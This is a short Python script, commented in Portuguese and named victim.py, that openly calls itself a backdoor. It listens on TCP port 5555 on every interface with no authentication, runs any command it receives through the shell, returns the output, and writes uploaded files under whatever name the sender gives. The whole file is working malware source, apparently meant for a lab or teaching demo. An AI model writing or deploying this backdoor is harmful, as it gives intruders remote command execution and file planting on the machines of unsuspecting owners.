############################################
#               victim.py                  #
#  Backdoor (escutando conexoes TCP)       #
#  Funcoes:                                #
#  - Executar comandos remotos             #
#  - Receber uploads de arquivos           #
############################################

import socket
import subprocess
import threading

HOST = '0.0.0.0'  # Escuta em todas interfaces
PORT = 5555

def handle_client(client_socket):
    try:
        while True:
            client_socket.send(b'Comando ou "UPLOAD <nome_arquivo>": ')
            cmd_buffer = ''
            while '\n' not in cmd_buffer:
                data = client_socket.recv(4096)
                if not data:
                    break
                cmd_buffer += data.decode()

            if cmd_buffer.startswith('UPLOAD'):
                _, filename = cmd_buffer.strip().split(maxsplit=1)
                client_socket.send(b'Enviando arquivo...\n')
                file_buffer = b''
                while True:
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    file_buffer += data
                with open(filename, 'wb') as f:
                    f.write(file_buffer)
                client_socket.send(f'Arquivo {filename} salvo com sucesso!\n'.encode())
            else:
                output = subprocess.getoutput(cmd_buffer.strip())
                if output:
                    client_socket.send(output.encode() + b'\n')
                else:
                    client_socket.send(b'Comando executado sem saida.\n')
    except Exception as e:
        print(f'Erro: {e}')
    finally:
        client_socket.close()


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)
print(f'[*] Escutando em {HOST}:{PORT}')

while True:
    client, addr = server.accept()
    print(f'[*] Conexao de {addr[0]}:{addr[1]}')
    client_thread = threading.Thread(target=handle_client, args=(client,))
    client_thread.start()